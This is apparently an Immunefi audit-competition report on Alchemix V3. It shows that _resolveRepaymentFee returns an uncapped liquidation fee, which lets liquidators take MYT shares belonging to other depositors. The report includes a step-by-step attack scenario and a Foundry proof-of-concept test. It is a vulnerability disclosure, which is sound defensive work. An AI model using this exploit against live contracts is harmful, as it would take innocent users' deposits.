# 58518 sc critical liquidation will steal repayment fee from innocent users funds

**Submitted on Nov 2nd 2025 at 23:47:30 UTC by @gizzy for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58518
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

The `_resolveRepaymentFee()` function in `AlchemistV3.sol` has a critical accounting bug where it returns the **calculated fee amount** instead of the **actual amount deducted** from the user's collateral. When a liquidated account has insufficient collateral to cover the full repayment fee, the function caps the deduction to the available balance but still returns the uncapped fee. This causes the protocol to transfer more MYT shares than it actually deducted from the account, **stealing funds directly from other users' collateral**.

## Vulnerability Details

### Root Cause

In `AlchemistV3.sol:909-916`, the `_resolveRepaymentFee()` function:

```solidity
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
    Account storage account = _accounts[accountId];
    // calculate repayment fee and deduct from account
    fee = repaidAmountInYield * repaymentFee / BPS;
    account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
    return fee;  // ← BUG: Returns calculated fee, not actual deduction
}
```

**The Bug:**

1. Line 912: Calculates `fee = repaidAmount × 3%`
2. Line 913: Deducts `min(fee, account.collateralBalance)` from the account
3. Line 915: **Returns the original `fee`**, not the capped amount

The returned fee is sent to the liquidator via `TokenUtils.safeTransfer(myt, msg.sender, feeInYield)` in two places:

**Location 1: `_liquidate()` line 833:**

```solidity
if (account.debt == 0) {
    feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
    TokenUtils.safeTransfer(myt, msg.sender, feeInYield);  // Sends inflated fee
    return (repaidAmountInYield, feeInYield, 0);
}
```

**Location 2: `_liquidate()` line 847:**

```solidity
if (collateralizationRatio > collateralizationLowerBound) {
    feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
    TokenUtils.safeTransfer(myt, msg.sender, feeInYield);  // Sends inflated fee
    return (repaidAmountInYield, feeInYield, 0);
}
```

### Step-by-Step Attack Vector

#### Initial Setup

* **Alice**: Deposits 1,000 MYT shares worth $1,000, borrows $900 (max LTV)
* **Bob**: Deposits 1,000 MYT shares worth $1,000, borrows nothing (provides liquidity)
* **Total Alchemist Balance**: 2,000 MYT shares

#### Attack Execution

**Step 1: Alice Creates Redemption**

* Alice creates redemption in Transmuter with all 900 alTokens
* Time passes: Full transmutation period
* Earmarked debt: \~$899

**Step 2: Price Crash**

* MYT price drops 10%
* Alice's collateral value: 1,000 shares × $0.909 = **$909**
* Alice's debt: **$900**
* Collateralization: **101%** (below 105% threshold)

**Step 3: Liquidation**

Liquidator calls `liquidate(aliceTokenId)`:

```solidity
// 1. _forceRepay() repays $899 of debt
repaidAmountInYield = _forceRepay(accountId, $899)
// Converts $899 debt → ~990 MYT shares
// Deducts 990 shares from Alice's 1000 shares
// Alice's remaining collateral: 10 shares ≈ $9.09
// Alice's remaining debt: $1

// Alchemist balance: 2000 - 990 = 1010 shares
// (990 shares transferred to Transmuter)

// 2. Check if debt fully cleared - NO (still has $1 debt)

// 3. Recalculate collateralization
collateralValue = $9.09
debt = $1
ratio = 909% (HEALTHY, > 105%)

// 4. Calculate repayment fee
feeInYield = _resolveRepaymentFee(accountId, 990 shares)
// Inside _resolveRepaymentFee:
//   fee =  say 20 shares
//   account.collateralBalance = 10 shares 
//   
//   Deduction: account.collateralBalance -= min(20, 10) = 10 - 10 = 0
//   Alice now has: 0 collateral
//   
//   Return: fee = 20 shares (NOT 10!)

// 5. Transfer fee to liquidator
TokenUtils.safeTransfer(myt, liquidator, 20 shares)
// Alchemist balance: 1010 - 20 = 990 shares
```

**Bob Tries to Withdraw**

When Bob tries to withdraw his full 1,000 shares:

```solidity
alchemist.withdraw(1000 shares, bob, bobTokenId)
// This will REVERT because:
// - Bob's account.collateralBalance = 1000 shares
// - Alchemist's actual MYT balance = 990 shares
// - Transfer underflows: 990 - 1000 = REVERT
```

Bob is now **DOS'd from his own funds** or will receive less than his deposited amount.

## Impact

**Direct Theft of User Funds**

* Innocent users lose funds to cover fees from insolvent accounts

**DOS**

* When multiple users with insufficient collateral are liquidated, the theft compounds
* Eventually, the Alchemist contract becomes insolvent (`_mytSharesDeposited > actual balance`)

### Likelihood

**High** - This occurs whenever:

* A liquidated account has insufficient collateral to cover the full 3% repayment fee

## Reference

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L900C3-L907C6>

## Proof of Concept

## Proof of Concept

Add this test to `src/test/AlchemistV3.t.sol` (<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/test/AlchemistV3.t.sol>):

### Running the POC

```bash
forge test --match-test testPOC_RepaymentFee_Steals_From_Other_Users -vv
```

```solidity
    function testPOC_RepaymentFee_Steals_From_Other_Users() external {
    console.log("\n=== POC: Repayment Fee Steals Funds from Other Users ===\n");
    
    vm.prank(alOwner);
    alchemist.setProtocolFee(protocolFee);
    
    uint256 depositAmount = 1000e18;
    
    // === STEP 1: Alice deposits and borrows ===
    vm.startPrank(address(0xbeef)); // Alice
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
    alchemist.deposit(depositAmount, address(0xbeef), 0);
    uint256 tokenIdAlice = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
    
    uint256 maxBorrowable = alchemist.getMaxBorrowable(tokenIdAlice);
    alchemist.mint(tokenIdAlice, maxBorrowable, address(0xbeef));
    vm.stopPrank();
    
    console.log("Step 1: Alice deposits and borrows");
    console.log("  Alice's collateral:", depositAmount / 1e18, "shares");
    console.log("  Alice's debt:", maxBorrowable / 1e18, "alTokens");
    
    // === STEP 2: Bob deposits (no borrowing) ===
    vm.startPrank(address(0xdad)); // Bob
    SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
    alchemist.deposit(depositAmount, address(0xdad), 0);
    uint256 tokenIdBob = AlchemistNFTHelper.getFirstTokenId(address(0xdad), address(alchemistNFT));
    vm.stopPrank();
    
    console.log("\nStep 2: Bob deposits (healthy user, no debt)");
    console.log("  Bob's collateral:", depositAmount / 1e18, "shares");
    console.log("  Bob's debt: 0 alTokens");
    
    uint256 alchemistBalanceInitial = vault.balanceOf(address(alchemist));
    console.log("\nAlchemist total balance:", alchemistBalanceInitial / 1e18, "shares");
    
    // === STEP 3: Alice creates redemption ===
    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), maxBorrowable);
    transmuterLogic.createRedemption(maxBorrowable);
    vm.stopPrank();
    
    console.log("\nStep 3: Alice creates redemption");
    
    vm.roll(block.number + 1);
    alchemist.poke(tokenIdAlice);
    
    // === STEP 4: Wait for maturity ===
    vm.roll(block.number + 5_256_000);
    console.log("\nStep 4: Fast forward to full maturity");
    
    // === STEP 5: Price crash ===
    console.log("\nStep 5: PRICE CRASH - MYT drops 10%");
    uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
    uint256 modifiedVaultSupply = (initialVaultSupply * 1100) / 1000; // 10% increase in supply = 10% price drop
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);
    
    (uint256 aliceCollateralBefore, uint256 aliceDebtBefore, uint256 aliceEarmarkedBefore) = alchemist.getCDP(tokenIdAlice);
    console.log("\nAlice's position after crash:");
    console.log("  Collateral:", aliceCollateralBefore / 1e18, "shares");
    console.log("  Collateral value:", alchemist.totalValue(tokenIdAlice) / 1e18, "USD");
    console.log("  Debt:", aliceDebtBefore / 1e18, "alTokens");
    console.log("  Earmarked:", aliceEarmarkedBefore / 1e18, "alTokens");
    
    (uint256 bobCollateralBefore,, ) = alchemist.getCDP(tokenIdBob);
    console.log("\nBob's position before liquidation:");
    console.log("  Collateral:", bobCollateralBefore / 1e18, "shares");
    
    uint256 alchemistBalanceBeforeLiq = vault.balanceOf(address(alchemist));
    console.log("\nAlchemist balance before liquidation:", alchemistBalanceBeforeLiq / 1e18, "shares");
    
    // === STEP 6: Liquidate Alice ===
    console.log("\nStep 6: Liquidator liquidates Alice");
    
    address liquidator = address(0xc0ffee);
    uint256 liquidatorBalanceBefore = vault.balanceOf(liquidator);
    
    vm.prank(liquidator);
    (uint256 amountLiquidated, uint256 feeReceived, ) = alchemist.liquidate(tokenIdAlice);
    
    uint256 liquidatorBalanceAfter = vault.balanceOf(liquidator);
    uint256 feeActuallyReceived = liquidatorBalanceAfter - liquidatorBalanceBefore;
    
    console.log("  Amount liquidated (repaid):", amountLiquidated / 1e18, "shares");
    console.log("  Fee  received:", feeActuallyReceived / 1e18, "shares");
    
    (uint256 aliceCollateralAfter, uint256 aliceDebtAfter, ) = alchemist.getCDP(tokenIdAlice);
    console.log("\nAlice's position after liquidation:");
    console.log("  Collateral:", aliceCollateralAfter / 1e18, "shares");
    console.log("  Debt:", aliceDebtAfter / 1e18, "alTokens");
    
    uint256 aliceCollateralDeducted = aliceCollateralBefore - aliceCollateralAfter;
    console.log("  Total deducted from Alice:", aliceCollateralDeducted / 1e18, "shares");
    
    uint256 alchemistBalanceAfterLiq = vault.balanceOf(address(alchemist));
    console.log("\nAlchemist balance after liquidation:", alchemistBalanceAfterLiq / 1e18, "shares");
    
 
    console.log("\n=== BOB'S LOSS ===");
    
    (uint256 bobCollateralAfter,, ) = alchemist.getCDP(tokenIdBob);
    console.log("Bob's recorded collateral:", bobCollateralAfter / 1e18, "shares");
    
    // Try to withdraw Bob's full amount
    vm.startPrank(address(0xdad));
    
    // This should work but the Alchemist has insufficient balance
    uint256 alchemistActualBalance = vault.balanceOf(address(alchemist));
    uint256 bobsShouldHave = bobCollateralAfter;
    
    console.log("\nBob tries to withdraw his", bobsShouldHave / 1e18, "shares");
    console.log("Alchemist only has:", alchemistActualBalance / 1e18, "shares total");

    vm.expectRevert();

    alchemist.withdraw(bobCollateralAfter,address(0xdad),tokenIdBob);
    vm.stopPrank();
}
```
